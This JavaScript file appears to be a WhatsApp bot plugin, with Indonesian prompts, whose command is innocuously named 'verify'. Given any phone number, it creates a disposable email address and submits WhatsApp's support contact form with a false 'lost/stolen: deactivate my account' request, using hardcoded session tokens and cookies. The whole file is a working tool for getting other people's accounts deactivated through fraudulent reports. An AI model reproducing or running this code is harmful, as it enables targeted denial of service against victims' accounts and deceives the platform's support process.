import util from "util"
import axios from 'axios'
let handler = async (m, { args, usedPrefix, command, text }) => {
    if(!text) return m.reply("Masukan nomer telepon")
if(!text.startsWith("+")) return m.reply("masukan kode negara comtoh +62")
var imel = await (await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")).data[0]
 let data = {
  jazoest: '2954',
  lsd: 'AVotQVSNJiE',
  step: 'articles',
  country_selector: 'BR',
  phone_number: text,
  email: imel,
  email_confirm: imel,
  platform: 'ANDROID',
  your_message: 'Perdido/roubado: desative minha conta',
  __user: '0',
  __a: '1',
  __dyn: '7wKwkHgmwn8K2WnFwn84a2i5U4e1Fx-ewSwMxW0SU1nEhwem0nCq1ewcG0KE33w8G1nzU1vrzo5-0me220qu0L8ly82swdq0Ho2ewnE3fw6iw4vwbS1Lw4Cw',
  __csr: '',
  __req: '7',
  __hs: '19319.BP:whatsapp_www_pkg.2.22.23.85',
  dpr: '1',
  __ccg: 'UNKNOWN',
  __rev: '1006635516',
  __s: 'ng4ktn:fe3p07:ramsmu',
  __hsi: '7169210791910218313',
  __comet_req: '0'
}

let res = await axios({
  url: "https://www.whatsapp.com/contact/noclient/async/",
  method: "POST",
  headers: {
    cookie: "wa_lang_pref=tp_br; wa_ul=cf4df212-78b9-481b-8276-9dc801b280000; wa_csrf=d1BrQRQLuxsm0UE-L-O-wq",
  },
  data: new URLSearchParams(data)+""
}).then(res => res).catch(err => err.response)
return m.reply(util.format(JSON.stringify( res.status == 200 ? JSON.parse(res.data.replace("for (;;);", "")):res, null, 2)))
}
handler.help = ['verify']
handler.tags = ['tools']
handler.command = /^(verify)$/i
handler.owner = true
export default handler


const fetchJson = (url, options) => new Promise(async(resolve, reject) => {
    fetch(url, options)
        .then(response => response.json())
        .then(json => {
            resolve(json)
        })
        .catch((err) => {
            reject(err)
        })
})